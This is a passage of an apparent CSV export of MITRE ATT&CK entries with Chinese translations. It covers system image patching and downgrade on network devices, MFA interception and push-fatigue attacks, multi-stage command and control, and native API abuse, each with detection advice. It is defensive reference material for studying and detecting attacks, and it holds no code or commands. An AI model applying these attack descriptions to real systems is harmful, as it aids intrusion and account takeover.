（引用：TrendMicro POWELIKS AUG 2014）（引用：SpectorOps Hiding Reg 2017 年 7 月）可以修改远程系统的注册表，以帮助执行文件作为横向移动的一部分。它要求远程注册表服务在目标系统上运行。 （引用：Microsoft Remote）通常需要 [有效帐户](https://attack.mitre.org/techniques/T1078)，以及对远程系统的 [SMB/Windows Admin Shares](https://attack. mitre.org/techniques/T1021/002) 用于 RPC 通信。
T1601,Modify System Image,"Adversaries may make changes to the operating system of embedded network devices to weaken defenses and provide new capabilities for themselves.  On such devices, the operating systems are typically monolithic and most of the device functionality and capabilities are contained within a single file.

To change the operating system, the adversary typically only needs to affect this one file, replacing or modifying it.  This can either be done live in memory during system runtime for immediate effect, or in storage to implement the change on the next boot of the network device.",https://attack.mitre.org/techniques/T1601,19 October 2020,22 October 2020,1.0,Defense Evasion,"Most embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because this method may be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001), it may be appropriate to also verify the integrity of the vendor provided operating system image file. 

Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.  (Citation: Cisco IOS Software Integrity Assurance - Image File Verification)

Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)",Network,File: File Modification,False,,,,Administrator,,,,,,",(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS),(Citation: Cisco IOS Software Integrity Assurance - Credentials Management),(Citation: NIST 800-63-3),(Citation: Cisco IOS Software Integrity Assurance - TACACS)",修改系统镜像,攻击者可能会对嵌入式网络设备的操作系统进行更改，以削弱防御并为自己提供新功能。在此类设备上，操作系统通常是单片的，并且大多数设备功能和能力都包含在单个文件中。要更改操作系统，攻击者通常只需要影响这个文件，替换或修改它。这可以在系统运行时在内存中实时完成以立即生效，或者在存储中实现网络设备下次启动时的更改。
T1601.002,Modify System Image: Downgrade System Image,"Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. (Citation: Cisco Synful Knock Evolution)

On embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.

Downgrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).  ",https://attack.mitre.org/techniques/T1601/002,19 October 2020,22 October 2020,1.0,Defense Evasion,"Many embedded network devices provide a command to print the version of the currently running operating system.  Use this command to query the operating system for its version number and compare it to what is expected for the device in question.  Because image downgrade may be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001), it may be appropriate to also verify the integrity of the vendor provided operating system image file. ",Network,File: File Modification,True,T1601,,,Administrator,,,,,,",(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS),(Citation: Cisco IOS Software Integrity Assurance - Credentials Management),(Citation: NIST 800-63-3),(Citation: Cisco IOS Software Integrity Assurance - TACACS)",修改系统镜像：降级系统镜像,攻击者可能会安装旧版本的网络设备操作系统来削弱安全性。网络设备上较旧的操作系统版本通常具有较弱的加密密码，并且通常具有较少/较少更新的防御功能。 （引用：Cisco Synful Knock Evolution）在嵌入式设备上，降级版本通常只需要替换存储中的操作系统文件。对于大多数嵌入式设备，这可以通过下载所需版本的操作系统文件的副本并重新配置设备以在下次系统重新启动时从该文件引导来实现。然后，攻击者可以重新启动设备以立即实施更改，或者他们可以等到下次系统重新启动时。将系统映像降级到旧版本可能允许攻击者通过启用诸如 [Weaken Encryption] (https://attack.mitre.org/techniques/T1600) 之类的行为来逃避防御。系统映像的降级可以单独进行，也可以与 [Patch System Image] (https://attack.mitre.org/techniques/T1601/001) 结合使用。
T1601.001,Modify System Image: Patch System Image,"Adversaries may modify the operating system of a network device to introduce new capabilities or weaken existing defenses.(Citation: Killing the myth of Cisco IOS rootkits) (Citation: Killing IOS diversity myth) (Citation: Cisco IOS Shellcode) (Citation: Cisco IOS Forensics Developments) (Citation: Juniper Netscreen of the Dead) Some network devices are built with a monolithic architecture, where the entire operating system and most of the functionality of the device is contained within a single file.  Adversaries may change this file in storage, to be loaded in a future boot, or in memory during runtime.

To change the operating system in storage, the adversary will typically use the standard procedures available to device operators. This may involve downloading a new file via typical protocols used on network devices, such as TFTP, FTP, SCP, or a console connection.  The original file may be overwritten, or a new file may be written alongside of it and the device reconfigured to boot to the compromised image.

To change the operating system in memory, the adversary typically can use one of two methods. In the first, the adversary would make use of native debug commands in the original, unaltered running operating system that allow them to directly modify the relevant memory addresses containing the running operating system.  This method typically requires administrative level access to the device.

In the second method for changing the operating system in memory, the adversary would make use of the boot loader. The boot loader is the first piece of software that loads when the device starts that, in turn, will launch the operating system.  Adversaries may use malicious code previously implanted in the boot loader, such as through the [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) method, to directly manipulate running operating system code in memory.  This malicious code in the bootloader provides the capability of direct memory manipulation to the adversary, allowing them to patch the live operating system during runtime.

By modifying the instructions stored in the system image file, adversaries may either weaken existing defenses or provision new capabilities that the device did not have before. Examples of existing defenses that can be impeded include encryption, via [Weaken Encryption](https://attack.mitre.org/techniques/T1600), authentication, via [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004), and perimeter defenses, via [Network Boundary Bridging](https://attack.mitre.org/techniques/T1599).  Adding new capabilities for the adversary’s purpose include [Keylogging](https://attack.mitre.org/techniques/T1056/001), [Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/003), and [Port Knocking](https://attack.mitre.org/techniques/T1205/001).

Adversaries may also compromise existing commands in the operating system to produce false output to mislead defenders.   When this method is used in conjunction with [Downgrade System Image](https://attack.mitre.org/techniques/T1601/002), one example of a compromised system command may include changing the output of the command that shows the version of the currently running operating system.  By patching the operating system, the adversary can change this command to instead display the original, higher revision number that they replaced through the system downgrade. 

When the operating system is patched in storage, this can be achieved in either the resident storage (typically a form of flash memory, which is non-volatile) or via [TFTP Boot](https://attack.mitre.org/techniques/T1542/005). 

When the technique is performed on the running operating system in memory and not on the stored copy, this technique will not survive across reboots.  However, live memory modification of the operating system can be combined with [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) to achieve persistence. ",https://attack.mitre.org/techniques/T1601/001,19 October 2020,22 October 2020,1.0,Defense Evasion,"Compare the checksum of the operating system file with the checksum of a known good copy from a trusted source.  Some embedded network device platforms may have the capability to calculate the checksum of the file, while others may not.  Even for those platforms that have the capability, it is recommended to download a copy of the file to a trusted computer to calculate the checksum with software that is not compromised.(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)

Many vendors of embedded network devices can provide advanced debugging support that will allow them to work with device owners to validate the integrity of the operating system running in memory.  If a compromise of the operating system is suspected, contact the vendor technical support and seek such services for a more thorough inspection of the current running system.  (Citation: Cisco IOS Software Integrity Assurance - Run-Time Memory Verification)",Network,File: File Modification,True,T1601,,,Administrator,,,,,,"(Citation: Cisco Synful Knock Evolution),(Citation: Mandiant - Synful Knock),(Citation: Cisco IOS Software Integrity Assurance - Secure Boot),(Citation: Cisco IOS Software Integrity Assurance - Deploy Signed IOS),(Citation: Cisco IOS Software Integrity Assurance - Credentials Management),(Citation: NIST 800-63-3),(Citation: Cisco IOS Software Integrity Assurance - TACACS)",修改系统镜像：补丁系统镜像,攻击者可能会修改网络设备的操作系统以引入新功能或削弱现有防御。（引文：消除 Cisco IOS rootkit 的神话）（引文：消除 IOS 多样性神话）（引文：Cisco IOS Shellcode）（引文：Cisco IOS Forensics Developments）（引文：Juniper Netscreen of the Dead）一些网络设备采用单体架构构建，其中整个操作系统和设备的大部分功能都包含在单个文件中。攻击者可能会在存储中更改此文件，以便在将来的引导中加载，或者在运行时在内存中进行更改。要更改存储中的操作系统，攻击者通常会使用设备操作员可用的标准程序。这可能涉及通过网络设备上使用的典型协议（例如 TFTP、FTP、SCP 或控制台连接）下载新文件。原始文件可能会被覆盖，或者可能会在其旁边写入一个新文件，然后重新配置设备以引导到受损映像。要更改内存中的操作系统，攻击者通常可以使用两种方法之一。首先，攻击者将利用原始、未更改的运行操作系统中的本机调试命令，允许他们直接修改包含运行操作系统的相关内存地址。此方法通常需要对设备进行管理级别的访问。在第二种更改内存中操作系统的方法中，攻击者将使用引导加载程序。引导加载程序是设备启动时加载的第一个软件，它反过来会启动操作系统。攻击者可能会使用之前植入引导加载程序的恶意代码，例如通过 [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) 方法，直接操纵内存中正在运行的操作系统代码。引导加载程序中的这种恶意代码为攻击者提供了直接内存操作的能力，允许他们在运行时修补实时操作系统。通过修改存储在系统映像文件中的指令，攻击者可能会削弱现有防御或提供设备以前没有的新功能。可以阻止的现有防御示例包括加密，通过 [Weaken Encryption](https://attack.mitre.org/techniques/T1600)，身份验证，通过 [网络设备身份验证](https://attack.mitre.org) /techniques/T1556/004）和外围防御，通过[网络边界桥接]（https://attack.mitre.org/techniques/T1599）。为攻击者添加新功能包括 [Keylogging](https://attack.mitre.org/techniques/T1056/001)、[Multi-hop Proxy](https://attack.mitre.org/techniques/T1090/ 003) 和 [端口敲击](https://attack.mitre.org/techniques/T1205/001)。攻击者还可能破坏操作系统中的现有命令，以产生虚假输出来误导防御者。当此方法与 [Downgrade System Image] (https://attack.mitre.org/techniques/T1601/002) 结合使用时，一个受感染系统命令的示例可能包括更改显示版本的命令的输出当前运行的操作系统。通过修补操作系统，攻击者可以更改此命令，以显示他们通过系统降级替换的原始更高版本号。当操作系统在存储中打补丁时，这可以在常驻存储（通常是一种非易失性闪存）或通过 [TFTP Boot]（https://attack.mitre.org/techniques）中实现/T1542/005）。当该技术在内存中正在运行的操作系统上而不是在存储的副本上执行时，该技术将无法在重新启动后继续存在。但是操作系统的实时内存修改可以结合[ROMMONkit](https://attack.mitre.org/techniques/T1542/004)实现持久化。
T1111,Multi-Factor Authentication Interception,"Adversaries may target multi-factor authentication (MFA) mechanisms, (I.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. 

If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)

Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)

Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors. (Citation: Operation Emmental)",https://attack.mitre.org/techniques/T1111,31 May 2017,01 April 2022,2.0,Credential Access,"Detecting use of proxied smart card connections by an adversary may be difficult because it requires the token to be inserted into a system; thus it is more likely to be in use by a legitimate user and blend in with other network behavior.

Similar to [Input Capture](https://attack.mitre.org/techniques/T1056), keylogging activity can take various forms but can may be detected via installation of a driver, setting a hook, or usage of particular API calls associated with polling to intercept keystrokes.","Linux, Windows, macOS","Driver: Driver Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification",False,,,"John Lambert, Microsoft Threat Intelligence Center","Administrator, SYSTEM",,"Smart card Proxy: Use of smart cards for single or multifactor authentication to access to network resources. Attached smart card reader with card inserted.

Out-of-band one-time code: Access to the device, service, or communications to intercept the one-time code.

Hardware token: Access to the seed and algorithm of generating one-time codes.",,,,"(Citation: NCC Group Chimera January 2021),(Citation: KISA Operation Muzabi),(Citation: FoxIT Wocao December 2019),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: Alienvault Sykipot DOD Smart Cards),",多重身份验证拦截,攻击者可能会针对多因素身份验证 (MFA) 机制（即智能卡、令牌生成器等）来获得对可用于访问系统、服务和网络资源的凭证的访问权限。建议使用 MFA 并提供比单独使用用户名和密码更高级别的安全性，但组织应了解可用于拦截和绕过这些安全机制的技术。如果智能卡用于多因素身份验证，则需要使用键盘记录器在正常使用期间获取与智能卡关联的密码。通过插入的卡和对智能卡密码的访问，攻击者可以使用受感染的系统连接到网络资源，以使用插入的硬件令牌代理身份验证。 （引用：Mandiant M Trends 2011）攻击者也可能使用键盘记录器来类似地针对其他硬件令牌，例如 RSA SecurID。捕获令牌输入（包括用户的个人识别码）可以提供临时访问（即重放一次性密码直到下一次值翻转）以及可能使攻击者能够可靠地预测未来的身份验证值（给定对算法和任何用于生成附加临时代码的种子值）。 （引文：GCN RSA 2011 年 6 月）其他 MFA 方法可能会被对手截获并用于进行身份验证。通过带外通信（电子邮件、SMS）发送一次性代码是很常见的。如果设备和/或服务不安全，那么它可能容易被拦截。尽管主要针对网络犯罪分子，但这些身份验证机制已成为高级攻击者的目标。 （引用：埃门塔尔行动）
T1621,Multi-Factor Authentication Request Generation,"Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.

Adversaries in possession credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account.

In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.”(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)",https://attack.mitre.org/techniques/T1621,01 April 2022,05 August 2022,1.0,Credential Access,"Monitor user account logs as well as 2FA/MFA application logs for suspicious events: unusual login attempt source location, mismatch in location of login attempt and smart device receiving 2FA/MFA request prompts, and high volume of repeated login attempts, all of which may indicate user's primary credentials have been compromised minus 2FA/MFA mechanism. ","Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","Application Log: Application Log Content, Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication",False,,,"Jon Sternstein, Stern Security; Pawel Partyka, Microsoft 365 Defender; Shanief Webb",,,,,,,"(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe),(Citation: MSTIC DEV-0537 Mar 2022),(Citation: MFA Fatigue Attacks - PortSwigger)",多因素身份验证请求生成,攻击者可能会尝试绕过多因素身份验证 (MFA) 机制，并通过生成发送给用户的 MFA 请求来访问帐户。拥有 [有效帐户] (https://attack.mitre.org/techniques/T1078) 凭据的攻击者如果无法访问作为额外凭据和安全控制所需的 2FA 或 MFA 机制，则可能无法完成登录过程.为了规避这种情况，攻击者可能会滥用自动生成推送通知到 MFA 服务（例如 Duo Push、Microsoft Authenticator、Okta 或类似服务）来让用户授予对其帐户的访问权限。在某些情况下，攻击者可能会不断重复登录尝试，以便通过 MFA 推送通知、SMS 消息和电话轰炸用户，可能导致用户最终接受身份验证请求以响应“MFA 疲劳”。（引文：Russian 2FA Push Annoyance - Cimpanu）（引用：MFA 疲劳攻击 - PortSwigger）（引用：俄罗斯针对全球政府和商业实体的可疑活动）
T1104,Multi-Stage Channels,"Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.

Remote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.

The different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or [Fallback Channels](https://attack.mitre.org/techniques/T1008) in case the original first-stage communication path is discovered and blocked.",https://attack.mitre.org/techniques/T1104,31 May 2017,14 July 2020,1.0,Command and Control,Host data that can relate unknown or suspicious process activity using a network connection is important to supplement any existing indicators of compromise based on malware command and control signatures and infrastructure. Relating subsequent actions that may result from Discovery of the system and network information or Lateral Movement to the originating process may also yield useful data.,"Linux, Windows, macOS","Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow",False,,,,,,,,,,"(Citation: FireEye APT41 March 2020),(Citation: Zscaler Bazar September 2020),(Citation: Talos MuddyWater May 2019),(Citation: Cybereason Bazar July 2020),(Citation: FireEye APT30),(Citation: Chaos Stolen Backdoor),(Citation: FireEye APT17),(Citation: Unit 42 Valak July 2020),(Citation: FireEye Operation Double Tap),(Citation: Lazarus APT January 2022),",多阶段通信通道,对手可能会为在不同条件下或某些功能下使用的命令和控制创建多个阶段。使用多个阶段可能会混淆命令和控制通道，从而使检测更加困难。远程访问工具将回调第一阶段的命令和控制服务器以获取指令。第一阶段可能具有收集基本主机信息、更新工具和上传附加文件的自动化功能。此时可以上传第二个远程访问工具 (RAT)，以将主机重定向到第二阶段命令和控制服务器。第二阶段的功能可能会更加全面，并允许对手通过反向外壳和其他 RAT 功能与系统进行交互。不同的阶段可能会分开托管，没有重叠的基础设施。加载器还可能具有备份的第一阶段回调或 [Fallback Channels](https://attack.mitre.org/techniques/T1008)，以防发现并阻止原始的第一阶段通信路径。
T1106,Native API,"Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes.(Citation: NT API Windows)(Citation: Linux Kernel API) These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.

Native API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries.(Citation: OutFlank System Calls)(Citation: CyberBit System Calls)(Citation: MDSec System Calls) For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes.(Citation: Microsoft CreateProcess)(Citation: GNU Fork) This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.(Citation: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC)

Higher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.(Citation: Microsoft NET)(Citation: Apple Core Services)(Citation: MACOS Cocoa)(Citation: macOS Foundation)

Adversaries may abuse these OS API functions as a means of executing behaviors. Similar to [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system. While invoking API functions, adversaries may also attempt to bypass defensive tools (ex: unhooking monitored functions via [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)).",https://attack.mitre.org/techniques/T1106,31 May 2017,19 April 2022,2.1,Execution,"Monitoring API calls may generate a significant amount of data and may not be useful for defense unless collected under specific circumstances, since benign use of API functions are common and may be difficult to distinguish from malicious behavior. Correlation of other events with behavior surrounding API function calls using API monitoring will provide additional context to an event that may assist in determining if it is due to malicious behavior. Correlation of activity by process lineage by process ID may be sufficient. 

Utilization of the Windows APIs may involve processes loading/accessing system DLLs associated with providing called functions (ex: ntdll.dll, kernel32.dll, advapi32.dll, user32.dll, and gdi32.dll). Monitoring for DLL loads, especially to abnormal/unusual or potentially malicious processes, may indicate abuse of the Windows API. Though noisy, this data can be combined with other indicators to identify adversary activity. ","Linux, Windows, macOS","Module: Module Load, Process: OS API Execution",False,,,"Gordon Long, Box, Inc., @ethicalhax; Stefan Kanthak",,0.0,,,,,"(Citation: Unit 42 Gorgon Group Aug 2018),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Symantec Cicada November 2020),(Citation: Joe Sec Trickbot),(Citation: ESET Gamaredon June 2020),(Citation: Trend Micro Waterbear December 2019),(Citation: McAfee Bankshot),(Citation: ESET Turla PowerShell May 2019),(Citation: Talos Cobalt Strike September 2020),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Kaspersky Lyceum October 2021),(Citation: FoxIT Wocao December 2019),(Citation: TrendMicro Taidoor),(Citation: ATT QakBot April 2021),(Citation: ESET RTM Feb 2017),(Citation: ESET Hermetic Wizard March 2022),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Checkpoint Dridex Jan 2021),(Citation: Trend Micro Tick November 2019),(Citation: FireEye Ursnif Nov 2017),(Citation: Unit42 Emissary Panda May 2019),(Citation: McAfee Babuk February 2021),(Citation: Objective-See MacMa Nov 2021),(Citation: wardle evilquest partii),(Citation: Malwarebytes Kimsuky June 2021),(Citation: TrendMicro Netwalker May 2020),(Citation: Cybereason Bazar July 2020),(Citation: Fortinet Metamorfo Feb 2020),(Citation: Cybereason Chaes Nov 2020),(Citation: Trusteer Carberp October 2010),(Citation: Medium Metamorfo Apr 2020),(Citation: Talos Lokibot Jan 2021),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Accenture HyperStack October 2020),(Citation: Intel 471 REvil March 2020),(Citation: ASERT InnaputRAT April 2018),(Citation: BlackBerry CostaRicto November 2020),(Citation: Qualys Hermetic Wiper March 2022),(Citation: Unit42 BendyBear Feb 2021),(Citation: Checkpoint MosesStaff Nov 2021),(Citation: Forcepoint Monsoon),(Citation: ESET LightNeuron May 2019),(Citation: Cyble Egregor Oct 2020),(Citation: Trustwave Pillowmint June 2020),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Zscaler Higaisa 2020),(Citation: McAfee Cuba April 2021),(Citation: McAfee Sharpshooter December 2018),(Citation: CheckPoint Naikon May 2020),(Citation: Trustwave GoldenSpy June 2020),(Citation: ESET Bad Rabbit),(Citation: Github PowerShell Empire),(Citation: Cybereason Clop Dec 2020),(Citation: CheckPoint Volatile Cedar March 2015),(Citation: S2 Grupo TrickBot June 2017),(Citation: Unit 42 BackConfig May 2020),(Citation: Cisco Ukraine Wipers January 2022),(Citation: ESET PipeMon May 2020),(Citation: Cybereason StrifeWater Feb 2022),(Citation: Profero APT27 December 2020),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Hornet Security Avaddon June 2020),(Citation: McAfee Maze March 2020),(Citation: Malwarebytes Pony April 2016),(Citation: Talos Bisonal Mar 2020),(Citation: Cisco CaddyWiper March 2022),(Citation: McAfee Lazarus Nov 2020),(Citation: GitHub Bloodhound),(Citation: QiAnXin APT-C-36 Feb2019),(Citation: Donut Github),(Citation: Trend Micro KillDisk 1),(Citation: IBM MegaCortex),(Citation: Bitdefender APT28 Dec 2015),(Citation: Novetta Winnti April 2015),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: BiZone Lizar May 2021),(Citation: FireEye HAWKBALL Jun 2019),(Citation: BlackBerry Amadey 2020),(Citation: Check Point APT34 April 2021),(Citation: McAfee Honeybee),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Grandoreiro April 2020),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: CheckPoint Bandook Nov 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Malwarebytes Konni Aug 2021),(Citation: Checkpoint IndigoZebra July 2021),(Citation: Cylance Dust Storm),(Citation: McAfee Lazarus Jul 2020),(Citation: Proofpoint TA416 Europe March 2022),(Citation: MalwareBytes SideCopy Dec 2021),(Citation: Microsoft Actinium February 2022),(Citation: Eset Ramsay May 2020),(Citation: Crowdstrike Indrik November 2018),(Citation: Medium Babuk February 2021),(Citation: Cycraft Chimera April 2020),(Citation: Secureworks REvil September 2019),(Citation: ESET Turla Mosquito Jan 2018),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Talos Group123),(Citation: Lazarus APT January 2022),(Citation: NCSC Cyclops Blink February 2022),(Citation: ESET InvisiMole June 2020),(Citation: FireEye NETWIRE March 2019),(Citation: ESET ComRAT May 2020),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Trend Micro njRAT 2018),(Citation: CISA AA20-239A BeagleBoyz August 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: Group IB Silence Sept 2018),(Citation: Group IB GrimAgent July 2021),(Citation: Korean FSI TA505 2020),(Citation: NTT Security Flagpro new December 2021),(Citation: FireEye Hancitor),(Citation: Securelist APT10 March 2021),(Citation: ESET Dukes October 2019),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Fortinet Diavol July 2021),(Citation: Crowdstrike DriveSlayer February 2022),(Citation: Symantec W.32 Stuxnet Dossier),(Citation: objective-see windtail2 jan 2019),(Citation: ESET DazzleSpy Jan 2022),(Citation: Talos TinyTurla September 2021),(Citation: CrowdStrike Ryuk January 2019),(Citation: ESET Gelsemium June 2021),(Citation: NCC Group WastedLocker June 2020),(Citation: SecureList Silence Nov 2017),(Citation: Lastline PlugX Analysis),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: MSTIC FoggyWeb September 2021),(Citation: Qualys LolZarus),(Citation: SentinelOne Hermetic Wiper February 2022),(Citation: CarbonBlack Conti July 2020),(Citation: TrendMicro BlackTech June 2017),(Citation: Gh0stRAT ATT March 2019),(Citation: Kaspersky WIRTE November 2021),(Citation: Cybereason Conti Jan 2021),(Citation: Kaspersky Lab SynAck May 2018),(Citation: Mcafee Clop Aug 2019),(Citation: Malwarebytes Saint Bot April 2021),(Citation: FireEye FIN7 Oct 2019),(Citation: XAgentOSX 2017),(Citation: cobaltstrike manual),(Citation: ClearSky Lazarus Aug 2020),(Citation: IronNet BlackTech Oct 2021),(Citation: Bitdefender Naikon April 2021),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: ESET Attor Oct 2019),(Citation: Juniper IcedID June 2020),(Citation: Check Point Meteor Aug 2021),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: NSA MS AppLocker),(Citation: win10_asr),(Citation: Microsoft Windows Defender Application Control),(Citation: TechNet Applocker vs SRP),(Citation: Beechey 2010),(Citation: Windows Commands JPCERT),(Citation: Corio 2008)",原生 API/通过本机API执行,攻击者可能与本机操作系统应用程序编程接口 (API) 交互以执行行为。本机 API 提供了一种在内核中调用低级操作系统服务的受控方式，例如那些涉及硬件/设备、内存和进程的服务。（引用：NT API Windows）（引用：Linux Kernel API）系统启动期间的操作系统（当其他系统组件尚未初始化时）以及在日常操作期间执行任务和请求。原生 API 函数（如 <code>NtCreateProcess</code>）可以通过系统调用/系统调用直接调用，但这些功能也经常通过接口和库暴露给用户模式应用程序。（引用：OutFlank 系统调用）（ Citation: CyberBit System Calls)(Citation: MDSec System Calls) 例如，Windows API <code>CreateProcess()</code> 或 GNU <code>fork()</code> 等函数将允许程序和脚本启动其他进程。（引用：Microsoft CreateProcess）（引用：GNU Fork）这可能允许 API 调用者执行二进制文件、运行 CLI 命令、加载模块等，因为存在用于各种系统操作的数千个类似 API 函数。（引用: Microsoft Win32)(Citation: LIBC)(Citation: GLIBC) 更高级别的软件框架，例如 Microsoft .NET 和 macOS Cocoa，也可用于与本机 API 交互。这些框架通常为 API 功能提供语言包装器/抽象，并且旨在实现代码的易用性/可移植性。（引用：Microsoft NET）（引用：Apple Core Services）（引用：MACOS Cocoa）（引用：macOS 基金会）攻击者可能会滥用这些 OS API 函数作为执行行为的手段。与 [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) 类似，本机 API 及其接口层次结构提供了与受害系统的各种组件进行交互和利用的机制。在调用 API 函数时，攻击者还可能试图绕过防御工具（例如：通过 [禁用或修改工具] (https://attack.mitre.org/techniques/T1562/001) 取消挂钩受监控的函数）。
T1599,Network Boundary Bridging,"Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.

Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.

